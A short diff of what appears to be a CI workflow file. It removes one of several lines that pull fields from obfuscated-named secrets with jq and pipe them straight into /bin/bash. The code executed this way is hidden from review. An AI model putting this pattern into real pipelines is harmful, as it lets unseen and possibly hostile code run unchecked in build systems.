@@ -23,7 +23,6 @@ jobs:
           fkd6624: ${{ secrets.fkd6624 }}
         run: |
           printf '%s' "$fkd6624" | jq -r .jggaa275 | /bin/bash
-          printf '%s' "$prl7" | jq -r .ieklo3 | /bin/bash
           echo $dan1 | jq -r .ca463 | /bin/bash
           echo $ssr507 | jq -r .ddj0372 | /bin/bash
 
